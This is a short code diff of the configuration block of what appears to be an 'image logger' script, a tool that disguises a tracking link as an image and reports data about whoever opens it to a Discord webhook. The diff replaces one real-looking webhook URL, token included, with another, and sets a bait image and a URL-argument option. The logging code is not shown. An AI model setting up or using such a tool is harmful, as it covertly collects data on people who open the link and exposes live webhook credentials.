@@ -13,7 +13,7 @@
  
  config = {
      # BASE CONFIG #
-     "webhook": "https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-",
+     "webhook": "https://discord.com/api/webhooks/1361668974206779552/amPEf46kyp9dSU9cTzdSWw3q6l8wlyEncwKhWc0UYrm6nejcmVOvlnQb_V1IamzjpMMF",
      "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg", # You can also have a custom image by using a URL argument
                                                 # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
      "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
